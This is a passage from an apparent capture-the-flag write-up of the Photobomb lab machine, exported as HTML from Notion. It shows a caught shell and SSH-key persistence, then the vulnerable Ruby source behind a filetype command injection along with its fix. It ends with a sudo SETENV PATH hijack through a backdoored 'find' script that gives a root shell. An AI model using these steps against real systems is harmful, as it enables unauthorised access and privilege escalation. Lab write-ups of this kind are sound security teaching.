src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fb9a0ea7a-bc9b-4a90-93bf-237ef03144aa%2FUntitled.png?width=811&amp;table=block&amp;id=87206ea0-1848-4a49-86f1-adc72c4a7649" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/cc6df2a37c4e40c4a7b4a0e50b5405b8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The shell was caught on the listener.</span></span></p></div><div id="https://www.notion.so/f31ba57b4b2d41ea956fb4f43c796aab" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F778f1d30-8d36-4da8-9e72-722bd7ab51c3%2FUntitled.png?width=739&amp;table=block&amp;id=f31ba57b-4b2d-41ea-956f-b4f43c796aab"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F778f1d30-8d36-4da8-9e72-722bd7ab51c3%2FUntitled.png?width=739&amp;table=block&amp;id=f31ba57b-4b2d-41ea-956f-b4f43c796aab" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/3003de0f78954c018dfdf22e6e31b419" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ id</code></span></span></p></div><pre id="https://www.notion.so/dd4a75a4273a4825ba6e81c88c88b20f" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)</span></span></span></code></pre><div id="https://www.notion.so/89ebbed806474e74b97a2f21169a181b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Foothold gained as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">wizard</code></span><span class="SemanticString">. The user flag can also be read.</span></span></p></div><div id="https://www.notion.so/fe59df524236453ba2883bc3e552807b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat user.txt</code></span></span></p></div><pre id="https://www.notion.so/f160b9298e7f4a2d84fdb4c329add8c3" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>73986275************************</span></span></span></code></pre><div id="https://www.notion.so/0e06356dcb0f4d1b9555cb4cf127f0ca" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/8ece79b4ffd041648bc2e2ea7b8606e6" class="Divider"></div><h3 id="https://www.notion.so/4df722c7110e46be855cd1acaa928525" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/4df722c7110e46be855cd1acaa928525"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation:</span></span></h3><div id="https://www.notion.so/3c3e0e9c96304fe2ae97f23edf6b9307" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SSH Access:</strong></strong></strong></span></span></p></div><div id="https://www.notion.so/8df04ef353314873973e0b7e550b6e77" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For a more stable shell, I can grant myself SSH access. First I generated a SSH key pair:</span></span></p></div><div id="https://www.notion.so/1700128fc52c4fa28054a6d0ae516649" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ python3 -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</code></span></span></p></div><div id="https://www.notion.so/a08ef426f3e94bffb85cab70d553728e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh-keygen</code></span></span></p></div><div id="https://www.notion.so/a85a9f1e202d4028b1d559b5f655bbe3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat ~/.ssh/id_rsa.pub &gt; ~/.ssh/authorized_keys</code></span></span></p></div><div id="https://www.notion.so/73b424d3814e466ba8d60355e8426299" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I copied the private key to my host, granted it 600 permissions, and SSH in as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">wizard</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/0232d6ccb5e14580b2dbe69bf1e6b0a1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ chmod 600 wizard_key</code></span></span></p></div><div id="https://www.notion.so/58134a60bdcc4ac39a0e15e48ac97734" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh wizard@photobomb.htb -i wizard_key</code></span></span></p></div><div id="https://www.notion.so/99a0981e730e4db5b249f1b1b685910f" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ffcb07b62-9c36-4f4a-9217-330849f13fe3%2FUntitled.png?width=718&amp;table=block&amp;id=99a0981e-730e-4db5-b249-f1b1b685910f"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ffcb07b62-9c36-4f4a-9217-330849f13fe3%2FUntitled.png?width=718&amp;table=block&amp;id=99a0981e-730e-4db5-b249-f1b1b685910f" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/8a2a1eb839df40e0b3ee07561f8fc961" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Webapp Source:</strong></span></span></p></div><div id="https://www.notion.so/b1feeca91e28487aac5e9729ae346f71" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the source code now available, we can take a look at how the web app is left vulnerable.</span></span></p></div><div id="https://www.notion.so/0887a9cf47764de3b39a9bf3a30478fe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/home/wizard/photobomb/server.rb</code></span></span></p></div><pre id="https://www.notion.so/d4f55c9ea28f4bb199f551b75c7c592e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># server.rb</span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra'</span></span>

<span class="token operator">&lt;</span><span class="token operator">..</span><span class="token constant">SNIP</span><span class="token operator">..</span><span class="token operator">></span>

post <span class="token string-literal"><span class="token string">'/printer'</span></span> <span class="token keyword">do</span>
  photo <span class="token operator">=</span> params<span class="token punctuation">[</span><span class="token symbol">:photo</span><span class="token punctuation">]</span>
  filetype <span class="token operator">=</span> params<span class="token punctuation">[</span><span class="token symbol">:filetype</span><span class="token punctuation">]</span>
  dimensions <span class="token operator">=</span> params<span class="token punctuation">[</span><span class="token symbol">:dimensions</span><span class="token punctuation">]</span>

  <span class="token comment"># handle inputs</span>
  <span class="token keyword">if</span> photo<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex-literal"><span class="token regex">/\.{2}|\//</span></span><span class="token punctuation">)</span>
    halt <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'Invalid photo.'</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">if</span> <span class="token operator">!</span>FileTest<span class="token punctuation">.</span>exist<span class="token operator">?</span><span class="token punctuation">(</span> <span class="token string-literal"><span class="token string">"source_images/"</span></span> <span class="token operator">+</span> photo <span class="token punctuation">)</span>
    halt <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'Source photo does not exist.'</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">if</span> <span class="token operator">!</span>filetype<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex-literal"><span class="token regex">/^(png|jpg)/</span></span><span class="token punctuation">)</span>
    halt <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'Invalid filetype.'</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">if</span> <span class="token operator">!</span>dimensions<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token regex-literal"><span class="token regex">/^[0-9]+x[0-9]+$/</span></span><span class="token punctuation">)</span>
    halt <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'Invalid dimensions.'</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">case</span> filetype
  <span class="token keyword">when</span> <span class="token string-literal"><span class="token string">'png'</span></span>
    content_type <span class="token string-literal"><span class="token string">'image/png'</span></span>
  <span class="token keyword">when</span> <span class="token string-literal"><span class="token string">'jpg'</span></span>
    content_type <span class="token string-literal"><span class="token string">'image/jpeg'</span></span>
  <span class="token keyword">end</span>

  filename <span class="token operator">=</span> photo<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'.jpg'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">''</span></span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-literal"><span class="token string">'_'</span></span> <span class="token operator">+</span> dimensions <span class="token operator">+</span> <span class="token string-literal"><span class="token string">'.'</span></span> <span class="token operator">+</span> filetype
  response<span class="token punctuation">[</span><span class="token string-literal"><span class="token string">'Content-Disposition'</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"attachment; filename=</span><span class="token interpolation"><span class="token delimiter punctuation">#{</span><span class="token content">filename</span><span class="token delimiter punctuation">}</span></span><span class="token string">"</span></span>

  <span class="token keyword">if</span> <span class="token operator">!</span><span class="token builtin">File</span><span class="token punctuation">.</span>exists<span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'resized_images/'</span></span> <span class="token operator">+</span> filename<span class="token punctuation">)</span>
    command <span class="token operator">=</span> <span class="token string-literal"><span class="token string">'convert source_images/'</span></span> <span class="token operator">+</span> photo <span class="token operator">+</span> <span class="token string-literal"><span class="token string">' -resize '</span></span> <span class="token operator">+</span> dimensions <span class="token operator">+</span> <span class="token string-literal"><span class="token string">' resized_images/'</span></span> <span class="token operator">+</span> filename
    puts <span class="token string-literal"><span class="token string">"Executing: </span><span class="token interpolation"><span class="token delimiter punctuation">#{</span><span class="token content">command</span><span class="token delimiter punctuation">}</span></span><span class="token string">"</span></span>
    system<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
  <span class="token keyword">else</span>
    puts <span class="token string-literal"><span class="token string">"File already exists."</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">if</span> <span class="token builtin">File</span><span class="token punctuation">.</span>exists<span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'resized_images/'</span></span> <span class="token operator">+</span> filename<span class="token punctuation">)</span>
    halt <span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token builtin">IO</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'resized_images/'</span></span> <span class="token operator">+</span> filename<span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  <span class="token comment">#message = 'Failed to generate a copy of ' + photo + ' resized to ' + dimensions + ' with filetype ' + filetype</span>
  message <span class="token operator">=</span> <span class="token string-literal"><span class="token string">'Failed to generate a copy of '</span></span> <span class="token operator">+</span> photo
  halt <span class="token number">500</span><span class="token punctuation">,</span> message
<span class="token keyword">end</span></span></span></span></code></pre><div id="https://www.notion.so/965fd8c5143449c9bddca431fcf4ea3d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As expected, it’s using a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">convert</code></span><span class="SemanticString"> command for resizing the images. For the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">photo</code></span><span class="SemanticString"> parameter, it detects if it contains </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">../</code></span><span class="SemanticString">, as well as checking if the file exists before passing it into the command. Strict regex rules also applies on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dimensions</code></span><span class="SemanticString">. However, for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">filetype</code></span><span class="SemanticString">, it only verifies that it starts with either “jpg” or “png”, and ignores anything that follows, hence allowing injected payloads to be passed into the command. This can be fixed by adding a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$</code></span><span class="SemanticString"> at the end of the regex rule (i.e. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/^(png|jpg)$/</code></span><span class="SemanticString">), or simply by string comparison.</span></span></p></div><div id="https://www.notion.so/f3ea93ed0b1243d8a07e85fca863f699" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Sudo Rights:</strong></span></span></p></div><div id="https://www.notion.so/a11a0d70e29841ebbb962f874317c1bc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo -l</code></span></span></p></div><pre id="https://www.notion.so/93c16644e6834fbea0efc1350ef0cf7c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh</span></span></span></code></pre><div id="https://www.notion.so/8b7c207666ad4acaaafcb3ff73c93e94" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The user can run a cleanup script as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">root</code></span><span class="SemanticString">, and the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SETENV</code></span><span class="SemanticString"> tag implies that the environment variable for the command can also be set:</span></span></p></div><div id="https://www.notion.so/dade874948bf4db580e66011ffdb0f7f" class="Bookmark"><a href="https://www.sudo.ws/docs/man/1.8.23/sudo.man/#DESCRIPTION"><h5 class="Bookmark__Title">Sudo Manual</h5><p class="Bookmark__Desc">NAME sudo, sudoedit — execute a command as another user SYNOPSIS sudo -h | -K | -k | -V sudo -v [-AknS] [-a type] [-g group] [-h host] [-p prompt] [-u user] sudo -l [-AknS] [-a type] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command] sudo [-AbEHnPS] [-a type] [-C num] [-c class] [-g group] [-h host] [-p prompt] [-r role] [-t type] [-T timeout] [-u user] [VAR=value] [-i | -s] [command] sudoedit [-AknS] [-a type] [-C num] [-c class] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file .</p><p class="Bookmark__Link">https://www.sudo.ws/docs/man/1.8.23/sudo.man/#DESCRIPTION</p></a></div><blockquote id="https://www.notion.so/1caac1ba5ce7451fb465c54069734203" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">Variables passed on the command line are subject to restrictions imposed by the security policy plugin. The </span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">sudoers</em></em></em></em></em></em></em></span><span class="SemanticString"> policy subjects variables passed on the command line to the same restrictions as normal environment variables with one important exception. If the </span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">setenv</em></em></em></em></em></em></span><span class="SemanticString"> option is set in </span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">sudoers</em></em></em></em></em></em></em></span><span class="SemanticString">, the command to be run has the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SETENV</code></span><span class="SemanticString"> tag set or the command matched is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ALL</code></span><span class="SemanticString">, the user may set variables that would otherwise be forbidden.</span></span></blockquote><div id="https://www.notion.so/df2a44b085f046228838999e4c8309aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The script is vulnerable to path hijacking if full paths are not used for any of the executables in the script.</span></span></p></div><div id="https://www.notion.so/8efeddf19a1743bab13905e04f45a800" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/cleanup.sh</code></span></span></p></div><pre id="https://www.notion.so/755e11f606b442a49ebf2e927874d65f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token shebang important">#!/bin/bash</span>
<span class="token builtin class-name">.</span> /opt/.bashrc
<span class="token builtin class-name">cd</span> /home/wizard/photobomb

<span class="token comment"># clean up log files</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-s</span> log/photobomb.log <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token punctuation">[</span> <span class="token parameter variable">-L</span> log/photobomb.log <span class="token punctuation">]</span>
<span class="token keyword">then</span>
  /bin/cat log/photobomb.log <span class="token operator">></span> log/photobomb.log.old
  /usr/bin/truncate <span class="token parameter variable">-s0</span> log/photobomb.log
<span class="token keyword">fi</span>

<span class="token comment"># protect the priceless originals</span>
<span class="token function">find</span> source_images <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">'*.jpg'</span> <span class="token parameter variable">-exec</span> <span class="token function">chown</span> root:root <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">\</span><span class="token punctuation">;</span></span></span></span></code></pre><div id="https://www.notion.so/869a5d7e1d6c4a769de08f2587dcd873" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The script seems to clean up log files and reset ownership of the images. Instantly we can see that the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">find</code></span><span class="SemanticString"> binary is referenced without absolute path, and we can exploit it for privilege escalation by manipulating the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$PATH</code></span><span class="SemanticString"> variable.</span></span></p></div><div id="https://www.notion.so/2f86dc28a56c4390a8cc61d6556348e5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Also, note that the script references </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.bashrc</code></span><span class="SemanticString"> in an unusual location. We’ll come back to this later.</span></span></p></div><div id="https://www.notion.so/0ddda478f1e24b61a3cc26028517156c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/11c908a0e0424ff7853e1ae0f8041dd1" class="Divider"></div><h3 id="https://www.notion.so/b86ba1c4892a45f0829c9d64d4c4ab10" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/b86ba1c4892a45f0829c9d64d4c4ab10"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h3><div id="https://www.notion.so/36de511b9a4c4e68b5fbd1bae0af3211" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Option 1 — Path Hijack via </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">find</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/bc681152799b4831abb3b42c712ccdf5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">When referencing executables without using full paths, the system will sequentially search in the directories listed in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$PATH</code></span><span class="SemanticString"> to find the corresponding executable file. With </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SETENV</code></span><span class="SemanticString">, attackers may trick the system into executing malicious files by adding directories they control at the beginning of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$PATH</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/5456bed099ea4935ac6dfccd2c6ff508" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To exploit this, I first created a backdoor called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">find</code></span><span class="SemanticString"> in the user’s home directory:</span></span></p></div><div id="https://www.notion.so/2766e6fa21e846a7867a24340ddf2c48" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/home/wizard/find</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/5f63d7c2a71d4376a9c046b01e1ab550" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token shebang important">#!/bin/bash</span>

<span class="token function">bash</span></span></span></span></code></pre><div id="https://www.notion.so/299f739ff5bb4580868540e4a6989ea1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And grant the file execute permission.</span></span></p></div><div id="https://www.notion.so/2a36af9f37d5445495b5f6ac114715b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ chmod +x /home/wizard/find</code></span></span></p></div><div id="https://www.notion.so/be7b495476e6495eb9a3772b87af60d3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As a quick test with the current user, I added my home directory at the start of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$PATH</code></span><span class="SemanticString">, and asked the system to search for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">find</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/4be1dbfaec1e4a2a9bbfc0dd1cc0b6ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ export PATH=/home/wizard/:$PATH &amp;&amp; which find</code></span></span></p></div><pre id="https://www.notion.so/9c74168a0948471fa4fb30d48e395445" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>/home/wizard/find</span></span></span></code></pre><div id="https://www.notion.so/b6c0188ba1ec40b68f28555f290396fe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Instead of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/usr/bin/find</code></span><span class="SemanticString">, it located the backdoored version in my home directory.</span></span></p></div><div id="https://www.notion.so/8a527d816f6e456289f14edce6b7a00c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sudo</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SETENV</code></span><span class="SemanticString">, I can trick the system to run my backdoor and return me a root shell.</span></span></p></div><div id="https://www.notion.so/a699be4863c74e7aac2ca2f156ec8046" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo PATH=/home/wizard:$PATH /opt/cleanup.sh</code></span></span></p></div><div id="https://www.notion.so/4b8d29d33f764c1a828bebf839df12c2" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8f8ffd75-9a9f-444a-867f-00a34b528839%2FUntitled.png?width=558&amp;table=block&amp;id=4b8d29d3-3f76-4c1a-828b-ebf839df12c2"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8f8ffd75-9a9f-444a-867f-00a34b528839%2FUntitled.png?width=558&amp;table=block&amp;id=4b8d29d3-3f76-4c1a-828b-ebf839df12c2" style="width:558px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/27863d2e40d445dd9a02c8689bbc14ae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"># id</code></span></span></p></div><pre id="https://www.notion.so/2034f62ef97d409ca4b965cab6ce894d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><div id="https://www.notion.so/924449ec0fe145f587c005ffa2674cd6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span 